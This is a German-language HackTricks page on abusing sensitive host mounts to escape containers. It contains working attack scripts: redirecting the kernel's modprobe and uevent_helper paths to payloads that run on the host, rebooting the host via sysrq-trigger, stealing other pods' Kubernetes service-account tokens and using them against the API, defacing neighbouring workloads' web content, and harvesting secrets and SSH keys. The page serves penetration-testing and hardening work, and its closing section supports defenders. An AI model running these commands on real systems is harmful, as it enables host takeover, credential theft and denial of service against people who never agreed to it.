# Sensible Host-Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Übersicht

Host-Mounts gehören zu den praktisch wichtigsten Angriffspunkten für container escapes, da sie eine sorgfältig isolierte Prozesssicht oft wieder in eine direkte Sicht auf Host-Ressourcen zurückführen. Besonders gefährlich sind nicht nur Mounts von `/` — Bind-Mounts von `/proc`, `/sys`, `/var`, Laufzeitsockets, kubelet-verwaltetem Zustand oder gerätebezogenen Pfaden können Kernel-Steuerungen, Anmeldeinformationen, Dateisysteme benachbarter Container und Runtime-Management-Schnittstellen offenlegen.

Diese Seite steht getrennt neben den einzelnen Schutzseiten, weil das Missbrauchsmodell übergreifend ist. Ein beschreibbarer Host-Mount ist gefährlich teils wegen der Mount-Namespaces, teils wegen der User-Namespaces, teils wegen AppArmor- oder SELinux-Abdeckung und teils wegen des genau exponierten Host-Pfads. Die getrennte Behandlung als eigenes Thema macht die Angriffsfläche deutlich leichter nachvollziehbar.

## `/proc`-Offenlegung

procfs enthält sowohl gewöhnliche Prozessinformationen als auch wirkungsstarke Kernel-Steuerinterfaces. Ein Bind-Mount wie `-v /proc:/host/proc` oder eine Container-Ansicht, die unerwartet schreibbare proc-Einträge offenlegt, kann daher zu Informationsoffenlegung, Denial-of-Service oder direkter Code-Ausführung auf dem Host führen.

Wertvolle procfs-Pfade umfassen:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Missbrauch

Beginnen Sie damit zu prüfen, welche der wichtigen procfs-Einträge sichtbar oder schreibbar sind:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Diese Pfade sind aus verschiedenen Gründen interessant. `core_pattern`, `modprobe`, und `binfmt_misc` können zu Host-Code-Ausführungswegen werden, wenn sie beschreibbar sind. `kallsyms`, `kmsg`, `kcore`, und `config.gz` sind mächtige Reconnaissance-Quellen für Kernel-Exploits. `sched_debug` und `mountinfo` offenbaren Prozess-, cgroup- und Dateisystem-Kontexte, die helfen können, das Host-Layout aus dem Container heraus zu rekonstruieren.

Der praktische Wert jedes Pfades ist unterschiedlich, und sie alle so zu behandeln, als hätten sie denselben Einfluss, erschwert die Triage:

- `/proc/sys/kernel/core_pattern`  
  Wenn beschreibbar, ist dies einer der wirkungsstärksten procfs-Pfade, weil der Kernel nach einem Crash einen pipe handler ausführt. Ein Container, der `core_pattern` auf ein Payload zeigt, das in seinem overlay oder in einem gemounteten Host-Pfad gespeichert ist, kann oft Host-Codeausführung erhalten. Siehe auch [read-only-paths.md](protections/read-only-paths.md) für ein dediziertes Beispiel.
- `/proc/sys/kernel/modprobe`  
  Dieser Pfad steuert den userspace helper, den der Kernel verwendet, wenn er Modul-Lade-Logik aufrufen muss. Wenn er vom Container aus beschreibbar ist und im Host-Kontext interpretiert wird, kann er zu einem weiteren Host-Codeausführungs-Primitiv werden. Besonders interessant in Kombination mit einer Möglichkeit, den Helper-Pfad zu triggern.
- `/proc/sys/vm/panic_on_oom`  
  Dies ist normalerweise kein sauberer Escape-Primitive, kann aber Memory-Pressure in einen hostweiten Denial-of-Service verwandeln, indem OOM-Bedingungen in Kernel-Panic-Verhalten umgewandelt werden.
- `/proc/sys/fs/binfmt_misc`  
  Wenn die Registrierungsoberfläche beschreibbar ist, kann ein Angreifer einen Handler für einen gewählten magic value registrieren und Host-Context-Ausführung erhalten, wenn eine passende Datei ausgeführt wird.
- `/proc/config.gz`  
  Nützlich für die Kernel-Exploit-Triage. Hilft zu bestimmen, welche Subsysteme, Mitigations und optionale Kernel-Features aktiviert sind, ohne Host-Paket-Metadaten zu benötigen.
- `/proc/sysrq-trigger`  
  Meistens ein Denial-of-Service-Pfad, aber ein sehr ernstes Problem. Er kann den Host sofort neu starten, panic auslösen oder anderweitig stören.
- `/proc/kmsg`  
  Enthüllt Kernel ring buffer messages. Nützlich für host fingerprinting, crash analysis, und in manchen Umgebungen für leaking information helpful to kernel exploitation.
- `/proc/kallsyms`  
  Wertvoll, wenn lesbar, weil es exportierte Kernel-Symbolinformationen offenlegt und helfen kann, Annahmen zur Address-Randomization während der Entwicklung von Kernel-Exploits zu durchbrechen.
- `/proc/[pid]/mem`  
  Dies ist eine direkte Prozessspeicher-Schnittstelle. Wenn der Zielprozess mit den nötigen ptrace-ähnlichen Bedingungen erreichbar ist, kann sie das Lesen oder Modifizieren des Speichers eines anderen Prozesses erlauben. Der realistische Impact hängt stark von Credentials, `hidepid`, Yama und ptrace-Einschränkungen ab, daher ist es ein mächtiger, aber bedingter Pfad.
- `/proc/kcore`  
  Stellt eine core-image-artige Ansicht des Systemspeichers bereit. Die Datei ist sehr groß und umständlich zu verwenden, aber wenn sie in nennenswertem Umfang lesbar ist, deutet das auf eine schlecht exponierte Host-Speicheroberfläche hin.
- `/proc/kmem` und `/proc/mem`  
  Historisch hochwirksame rohe Speicherinterfaces. Auf vielen modernen Systemen sind sie deaktiviert oder stark eingeschränkt, aber wenn sie vorhanden und nutzbar sind, sollten sie als kritische Findings behandelt werden.
- `/proc/sched_debug`  
  Leaks scheduling- und Task-Informationen, die Host-Prozessidentitäten offenbaren können, selbst wenn andere Prozessansichten sauberer erscheinen als erwartet.
- `/proc/[pid]/mountinfo`  
  Extrem nützlich, um zu rekonstruieren, wo der Container tatsächlich auf dem Host liegt, welche Pfade overlay-backed sind und ob ein beschreibbares Mount zu Host-Inhalten oder nur zur Container-Schicht gehört.

Wenn `/proc/[pid]/mountinfo` oder Overlay-Details lesbar sind, verwende sie, um den Host-Pfad des Container-Dateisystems wiederherzustellen:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Diese Befehle sind nützlich, weil viele host-execution tricks erfordern, einen Pfad innerhalb des Containers in den entsprechenden Pfad aus Sicht des Hosts umzuwandeln.

### Vollständiges Beispiel: `modprobe` Helper Path Abuse

Wenn `/proc/sys/kernel/modprobe` vom Container aus beschreibbar ist und der helper path im host context interpretiert wird, kann er auf eine attacker-controlled payload umgeleitet werden:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Der genaue Auslöser hängt vom Ziel und dem Verhalten des kernel ab, aber wichtig ist, dass ein beschreibbarer helper-Pfad einen zukünftigen kernel helper-Aufruf in vom Angreifer kontrollierte host-path-Inhalte umleiten kann.

### Vollständiges Beispiel: Kernel Recon mit `kallsyms`, `kmsg`, und `config.gz`

Wenn das Ziel eine Bewertung der Exploitbarkeit statt einer unmittelbaren escape ist:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Diese Befehle helfen zu klären, ob nützliche Symbolinformationen sichtbar sind, ob aktuelle Kernel-Nachrichten interessante Zustände offenbaren und welche Kernel-Funktionen oder -Mitigationsmaßnahmen kompiliert sind. Die Auswirkung ist normalerweise kein direkter Escape, kann aber die Triage von Kernel-Schwachstellen deutlich verkürzen.

### Vollständiges Beispiel: SysRq Host Reboot

Wenn `/proc/sysrq-trigger` beschreibbar ist und für die Host-Sicht zugänglich ist:
```bash
echo b > /proc/sysrq-trigger
```
Die Folge ist ein sofortiger Neustart des Hosts. Das ist kein subtiles Beispiel, zeigt aber deutlich, dass die Offenlegung von procfs weitaus schwerwiegender sein kann als reine Informationsoffenlegung.

## `/sys`-Offenlegung

sysfs gibt große Mengen an Kernel- und Gerätezustand preis. Einige sysfs-Pfade sind hauptsächlich für fingerprinting nützlich, während andere die Ausführung von Helfern, das Geräteverhalten, die Konfiguration von security-modules oder den Firmware-Zustand beeinflussen können.

Wertvolle sysfs-Pfade sind unter anderem:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Diese Pfade sind aus verschiedenen Gründen relevant. `/sys/class/thermal` kann das Temperaturmanagement beeinflussen und damit die Stabilität des Hosts in schlecht exponierten Umgebungen beeinträchtigen. `/sys/kernel/vmcoreinfo` kann crash-dump- und Kernel-Layout-Informationen leak, die beim Low-Level-Host-fingerprinting helfen. `/sys/kernel/security` ist die `securityfs`-Schnittstelle, die von Linux Security Modules verwendet wird, daher kann unerwarteter Zugriff dort MAC-bezogenen Zustand offenlegen oder verändern. EFI-Variable-Pfade können firmware-gestützte Boot-Einstellungen beeinflussen, wodurch sie deutlich ernsthafter sind als gewöhnliche Konfigurationsdateien. `debugfs` unter `/sys/kernel/debug` ist besonders gefährlich, weil es bewusst eine entwicklerorientierte Schnittstelle ist und weit geringere Sicherheitsannahmen hat als gehärtete, produktionsorientierte Kernel-APIs.

Nützliche Befehle zur Überprüfung dieser Pfade sind:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
- `/sys/kernel/security` kann offenbaren, ob AppArmor, SELinux oder eine andere LSM-Oberfläche sichtbar ist, obwohl sie eigentlich host-only bleiben sollte.
- `/sys/kernel/debug` ist oft die alarmierendste Entdeckung in dieser Gruppe. Wenn `debugfs` gemountet und lesbar oder beschreibbar ist, ist mit einer umfangreichen kernel-nahen Oberfläche zu rechnen, deren konkretes Risiko von den aktivierten Debug-Knoten abhängt.
- Die Exposition von EFI-Variablen ist seltener, hat aber hohe Auswirkungen, weil sie firmware-gesicherte Einstellungen betrifft statt gewöhnlicher Laufzeitdateien.
- `/sys/class/thermal` ist hauptsächlich relevant für Host-Stabilität und Hardware-Interaktion, nicht für neat shell-style escape.
- `/sys/kernel/vmcoreinfo` ist hauptsächlich eine Quelle für Host-Fingerprinting und Crash-Analyse, nützlich zum Verständnis des niedrigstufigen Kernel-Zustands.

### Vollständiges Beispiel: `uevent_helper`

Wenn `/sys/kernel/uevent_helper` beschreibbar ist, kann der Kernel einen vom Angreifer kontrollierten Helper ausführen, wenn ein `uevent` ausgelöst wird:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Der Grund, warum das funktioniert, ist, dass der Helper-Pfad aus Sicht des Hosts interpretiert wird. Sobald er ausgelöst wird, läuft der Helper im Host-Kontext und nicht im aktuellen Container.

## `/var`-Freilegung

Das Mounten von `/var` des Hosts in einen Container wird oft unterschätzt, weil es nicht so dramatisch wirkt wie das Mounten von `/`. In der Praxis kann es jedoch ausreichen, um Runtime-Sockets, Container-Snapshot-Verzeichnisse, vom kubelet verwaltete Pod-Volumes, projizierte Service-Account-Tokens und benachbarte Anwendungs-Dateisysteme zu erreichen. Auf modernen Nodes ist `/var` häufig der Ort, an dem der betrieblich interessanteste Container-Zustand liegt.

### Kubernetes-Beispiel

Ein Pod mit `hostPath: /var` kann oft die projizierten Tokens anderer Pods und Overlay-Snapshot-Inhalte lesen:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Diese Befehle sind nützlich, weil sie beantworten, ob der Mount nur langweilige Anwendungsdaten oder hochkritische Cluster-Zugangsdaten exponiert. Ein lesbares service-account token kann lokale Codeausführung sofort in Zugriff auf die Kubernetes API verwandeln.

Wenn das Token vorhanden ist, prüfe, was es erreichen kann, anstatt bei der Entdeckung des Tokens aufzuhören:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Die Auswirkungen können hier deutlich größer sein als ein lokaler Node-Zugriff. Ein Token mit umfangreichen RBAC-Rechten kann ein gemountetes `/var` in eine clusterweite Kompromittierung verwandeln.

### Docker und containerd Beispiel

Auf Docker-Hosts befinden sich die relevanten Daten häufig unter `/var/lib/docker`, während sie auf containerd-gestützten Kubernetes-Nodes unter `/var/lib/containerd` oder in snapshotter-spezifischen Pfaden liegen können:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Wenn das gemountete `/var` schreibbare Snapshot-Inhalte einer anderen workload freigibt, kann der attacker Anwendungsdateien verändern, Web-Inhalte platzieren oder Startskripte ändern, ohne die aktuelle Containerkonfiguration anzufassen.

Konkrete Missbrauchsideen, sobald schreibbare Snapshot-Inhalte gefunden wurden:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Diese Befehle sind nützlich, weil sie die drei Hauptauswirkungsfamilien eines gemounteten `/var` zeigen: Manipulation von Anwendungen, Auslesen von Secrets und laterale Bewegung in benachbarte Workloads.

## Laufzeit-Sockets

Sensible Host-Mounts beinhalten oft Laufzeit-Sockets statt kompletter Verzeichnisse. Diese sind so wichtig, dass sie hier ausdrücklich wiederholt werden:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Siehe [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) für vollständige exploitation flows, sobald einer dieser sockets gemountet ist.

Als schnelles erstes Interaktionsmuster:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Wenn eine dieser Möglichkeiten erfolgreich ist, ist der Weg von "mounted socket" zu "start a more privileged sibling container" in der Regel deutlich kürzer als jeder Kernel-Breakout-Pfad.

## Mount-bezogene CVEs

Host mounts überschneiden sich außerdem mit Runtime-Schwachstellen. Wichtige aktuelle Beispiele sind:

- `CVE-2024-21626` in `runc`, wo ein leaked directory file descriptor das working directory auf dem Host-Dateisystem platzieren könnte.
- `CVE-2024-23651` und `CVE-2024-23653` in BuildKit, wo OverlayFS copy-up races während Builds Schreibzugriffe auf Host-Pfade erzeugen könnten.
- `CVE-2024-1753` in Buildah und Podman build flows, wo crafted bind mounts während des Builds `/` read-write exponieren könnten.
- `CVE-2024-40635` in containerd, wo ein großer `User`-Wert in ein UID 0-Verhalten überlaufen könnte.

Diese CVEs sind hier relevant, weil sie zeigen, dass die Behandlung von Mounts nicht nur eine Frage der Operator-Konfiguration ist. Die Runtime selbst kann ebenfalls durch Mounts verursachte Escape-Bedingungen einführen.

## Prüfungen

Verwende diese Befehle, um schnell die Mounts mit dem höchsten Risiko zu lokalisieren:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
- Das Root des Hosts, `/proc`, `/sys`, `/var` und Runtime-Sockets sind Befunde mit hoher Priorität.
- Beschreibbare proc/sys-Einträge bedeuten oft, dass das Mount hostweite Kernel-Kontrollen freigibt, statt eine sichere Container-Ansicht zu bieten.
- Gemountete `/var`-Pfade verdienen eine Überprüfung der Zugangsdaten und der benachbarten Workloads, nicht nur eine Dateisystem-Überprüfung.
